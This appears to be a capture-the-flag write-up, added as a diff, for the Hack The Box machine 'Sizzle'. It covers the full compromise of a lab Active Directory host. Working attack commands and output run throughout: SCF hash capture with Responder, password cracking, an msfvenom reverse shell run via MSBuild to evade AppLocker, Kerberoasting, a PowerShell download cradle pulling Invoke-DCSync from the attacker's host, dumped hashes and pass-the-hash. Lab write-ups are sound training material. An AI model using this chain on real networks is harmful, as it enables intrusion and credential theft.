@@ -1,0 +1,265 @@
+# First things first. nmap the box
+# Nmap 7.70SVN scan initiated Mon Feb 11 19:48:08 2019 as: nmap -sC -sV -oA nmap/initial 10.10.10.103
+Nmap scan report for 10.10.10.103
+Host is up (0.13s latency).
+Not shown: 987 filtered ports
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-02-12T00:50:48+00:00; -1m03s from scanner time.
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-02-12T00:50:48+00:00; -1m03s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-02-12T00:50:48+00:00; -1m03s from scanner time.
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-02-12T00:50:48+00:00; -1m03s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2019-02-12T00:50:48+00:00; -1m03s from scanner time.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70SVN%I=7%D=2/11%Time=5C62180A%P=x86_64-unknown-linux-gn
+SF:u%r(DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07
+SF:version\x04bind\0\0\x10\0\x03");
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1m03s, deviation: 0s, median: -1m03s
+|_p2p-conficker: ERROR: Script execution failed (use -d to debug)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-02-12T00:50:37
+|_  start_date: 2019-02-11T00:10:22
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Feb 11 19:51:54 2019 -- 1 IP address (1 host up) scanned in 225.84 seconds
+
+# We can see that SMB is open
+smbclient -L //10.10.10.103
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	CertEnroll      Disk      Active Directory Certificate Services share
+	Department Shares Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Operations      Disk      
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.10.103 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+# Connect to the 'Department Shares'
+# Find a Directory to write to and upload a SCF file
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+
+test.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.12\test.ico
+[Taskbar]
+Command=ToggleDesktop
+
+smb: \Users\Public\> put test.scf 
+putting file test.scf as \Users\Public\test.scf (0.2 kb/s) (average 0.2 kb/s)
+smb: \Users\Public\> ls
+  .                                   D        0  Sat Feb 16 16:18:14 2019
+  ..                                  D        0  Sat Feb 16 16:18:14 2019
+  test.scf                            A       88  Sat Feb 16 16:18:14 2019
+
+                7779839 blocks of size 4096. 2518764 blocks available
+
+# With the scf file uploaded to the SMB Share start responder to capture hashes of users that browse the share
+# responder -I tun0 -v
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
+[SMBv2] NTLMv2-SSP Username : HTB\amanda
+[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:c91629087c8836ee:9FEB46B3E5C2F44B76E47A201802D0AD:0101000000000000C0653150DE09D2018D4F51AB383DB1CF000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000082913484976B4120AD576A1C93B5C2FCBC82ADB215657A31035CC213B440B6760A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
+[SMBv2] NTLMv2-SSP Username : HTB\amanda
+[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:79a3b4e254c715db:0652224D5A93D3371E0D805C032FB160:0101000000000000C0653150DE09D201BD044A8DF6999C37000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000082913484976B4120AD576A1C93B5C2FCBC82ADB215657A31035CC213B440B6760A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
+[SMBv2] NTLMv2-SSP Username : HTB\amanda
+[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:30697c89ef1d6f8e:B98BEAAEB68334ACD9FA94F969D68CB8:0101000000000000C0653150DE09D2018C0CA289F04DEB34000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000082913484976B4120AD576A1C93B5C2FCBC82ADB215657A31035CC213B440B6760A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003200000000000000000000000000
+
+# Use John to crack the amanda hash
+# john --wordlist=/usr/share/wordlists/rockyou.txt amanda.hash
+amanda:Ashare1972
+
+# Equipped with the password for the user amanda access the Active Directory Certificate Services
+# Using this portal as the user amanda, Request a certificate >> advanced certificate request
+https://sizzle.htb.local/certsrv/certrqxt.asp
+# Generate your own cert and key and supply them to the Active Directory Certificate Services
+# openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr
+# Paste the server.csr file into the certificate request input filed and click submit
+# Download the certificate.
+
+# Get WinRM from GitHub
+https://github.com/WinRb/WinRM
+# This is a SOAP library that uses the functionality in Windows Remote Management(WinRM) to call native object in Windows. This includes, but is not limited to, running batch scripts, powershell scripts and fetching WMI variables. For more information on WinRM, please visit Microsoft's WinRM site.
+# Install WinRM
+# Using this winrm_shell.rb script and supplying your cert and key. 
+https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
+
+
+
+require 'winrm'
+
+# Author: Alamot
+
+conn = WinRM::Connection.new( 
+  endpoint: 'https://10.10.10.103:5986/wsman',
+  transport: :ssl,
+  client_cert: 'certnew.cer',
+  client_key: 'server.key',
+  :no_ssl_peer_verification => true
+)
+
+command=""
+
+conn.shell(:powershell) do |shell|
+    until command == "exit\n" do
+        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
+        print(output.output.chomp)
+        command = gets        
+        output = shell.run(command) do |stdout, stderr|
+            STDOUT.print stdout
+            STDERR.print stderr
+        end
+    end    
+    puts "Exiting with code #{output.exitcode}"
+end
+
+
+# run the winrm_shell.rb script
+# ruby winrm_shell.rb
+
+# No user yet.
+# We need to port forward some ports. There is probably many ways to do this but I chose to use meterpreter which means we need to do some work
+# Due to applocker we cannot run .exe files
+# We will use MSBuild.exe to run our meterpreter shell for us.
+# Generate payload.
+# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=44442 -e x86/shikata_ga_nai -i 20 -f csharp > payload.txt
+# Our payload is in C# because we are going to embedd it into this .xml
+https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
+# Change the shellcode in the script with the shellcode generated by msfvenom. Remember to change the byte size as well.
+# Once the shellcode is embedded and everything looks right save the file as a .csproj
+# Now upload the .csproj to C:\Users\amanda\Downloads\
+# Start a HTTP Server on local box
+# python -m SimpleHTTPServer 80
+# on the Sizzle box Invoke-WebRequest to download the file
+# Invoke-WebRequest -Uri "http://x.x.x.x/shell.csproj" -OutFile "C:\Users\amanda\Downloads\shell.csproj"
+# Set up your metasploit multi handler
+# msfconsole
+# use exploit/multi/handler
+
+# Next we will execute our shell.csproj using C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
+# C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Users\amanda\Downloads\shell.csproj
+# Boom! Meterpreter shell
+# Now we will port forward 389,88,464,636,3268,3269,6378
+meterpreter > portfwd add -l 389 -p 389 -r 10.10.10.103                                                                                                                                                           
+[*] Local TCP relay created: :389 <-> 10.10.10.103:389                    
+meterpreter > portfwd add -l 88 -p 88 -r 10.10.10.103          
+[*] Local TCP relay created: :88 <-> 10.10.10.103:88                     
+meterpreter > portfwd add -l 464 -p 464 -r 10.10.10.103                                        
+[*] Local TCP relay created: :464 <-> 10.10.10.103:464                        
+meterpreter > portfwd add -l 636 -p 636 -r 10.10.10.103                                                           
+[*] Local TCP relay created: :636 <-> 10.10.10.103:636                                           
+meterpreter > portfwd add -l 3268 -p 3268 -r 10.10.10.103                                 
+[*] Local TCP relay created: :3268 <-> 10.10.10.103:3268                                                                                              
+meterpreter > portfwd add -l 3269 -p 3269 -r 10.10.10.103                                       
+[*] Local TCP relay created: :3269 <-> 10.10.10.103:3269                                   
+meterpreter > portfwd add -l 6378 -p 6379 -r 10.10.10.103                          
+[*] Local TCP relay created: :6378 <-> 10.10.10.103:6379
+
+# Now back on our Kali host we will use GetUserSPN.py to obtain the hash for other users
+./GetUsersSPN.py -request -dc-ip 127.0.0.1 HTB.local/amanda:Ashare1972
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+Password:
+ServicePrincipalName  Name   MemberOf                                               PasswordLastSet      LastLogon           
+--------------------  -----  -----------------------------------------------------  -------------------  -------------------
+http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09  2019-02-16 14:48:53 
+
+
+
+$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$1da94318634c016845fd8a3a2faef7e1$263541c672f79ab8ded19bc34bcd97d2d29d0ee16884e4b2f8b67d7623ee4f26c228bbb7ecc8e73e118bbf22755226a8df90da5c8ae4aa50088ef69fb5afd778063e162ad8a967a2a4fc56dfef42ff0bdf18d4d7d77c5f99e9d97392590f27b5a81d35968727e2dfb8709619959650581918f0f5f4f73a31c9839f09b93a256492246ed6655217a910735c88b5cc30a6bb3d1213e7033bbceccabbbbd8c72be2d0a4abc3254659c7fdd6766912037a8990eafb0886c92de3d4b61ecfe9fcde1d4c5f6518d3504845862e5a21f434328adec4f5924a000d2af6014bf0a3feff039d23baf3063fcbc6f40a85867db2c71420f8b6e1436126d4a760bdfaf840b5b4ba618a0bd0bacbf9055e15d7dd12310ef88b38e30e55f2e69b06acf3dbc783b592da2f2931a6758063097b4b1fac96ed335a4df026251a18e29f5031b00ab4c7b8bcbe9a214748e6afbee8b4d8fc283bbb851dbc3fe6021c4511b7f76893981166a09c447b06b2c7d88038d408de73766a251dd5fc5b79dfd04aa41be553d71b5615fc6ee6c3ba226980b6772cf210cec7c02167ed2fe19afbc47622487e5ed7abafaf054e9b3ea9e4b9cc70284c02b1549ac3b7a287c97e8c789b9e61029dc67b0b6319a8177fcbbe96f4cc5b008dffaebb371746002c7ced3a30ea8943ec491dc927c9e0130df2bc87207b3845f7df26b8c6285b4973c7721cf70e527b87ef1dc73f090442699fac4f8919a3049d20270265e1c8b9f6389b35b071bba8fe31e9ec2ab366e2629ae5fe84316c6f9475c0fd2343a8c5913998163bf882ce92e56be35697810c2815bf31689082198332ddcd96e96d0ecc7dc805d5b5fee1fdb08d4958f9f285b2bf44620baa06ba493bf6f1f0349fa5f79fceb1f05165ae463d93d09aa462a501ef0db116351e5d1cb65e30db308b04958a95f9f83b5d7c32217047b157898b7214d5ea4bfc8e090561340e0a72740f37490fe2950861812f37fae3464fb8a0fddf5a01ad968072e4a21065bb0e1a72f69c2bb403976c83e157188203f09dba4b5a9a730f63f6850ad3a36554ac26d8e7bd0120a4872f7e371abd2d637c86069341f98dc0af735e8e6b9c7bd42f16b86d1f87c2dc84c0c19b6f965f46cd74f3ccf1a00ef8faa369cbabf9089a77576b730d5ed847fe968b8c5824acab785813f82295a6370b4d02e1b5e5d50c4ed5ef98acb8a07a7d3421f5fc9d2817eef44a94a5862c8a3506b1b50b0ec76a3e2a8882af
+
+# Now we have the hash for mrlky. Let crack it
+# Using john again
+# john --format=krb5tgs mrlky.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Football#7       (?)
+1g 0:00:00:06 DONE (2019-02-15 22:51) 0.1529g/s 1707Kp/s 1707Kc/s 1707KC/s Francisfer..Flubb3r
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+# Do the same for mrlky as we did for amanda using the Active Directory Certificate Services to request a certificate
+# Use the winrm_shell.rb script to login as mrlky.
+user.txt
+a6ca1f8ee9e3bff02e0ed918f9db1310
+
+# Now we need to Invoke-DCSync to get a hash dump
+# Using python simpleHTTPServer again to host Invoke-DCSync.ps1
+# On the Sizzle box running as mrlky 
+# powershell.exe -Version 2 -Exec Bypass /c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/Invoke-DCSync.ps1'); Invoke-DCSync -PWDumpFormat"
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+Guest:501:NONE:::
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+
+# Boom! We can now PassTheHash as Sizzler
+# Using Impacket's wmiexec.py to pass the hash and spawn cmd.exe
+# python /usr/share/doc/python-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de sizzler@10.10.10.103
+# Boom! 
+root.txt
+91c5849357ffe2c87683d3bd6729d72e
+
+
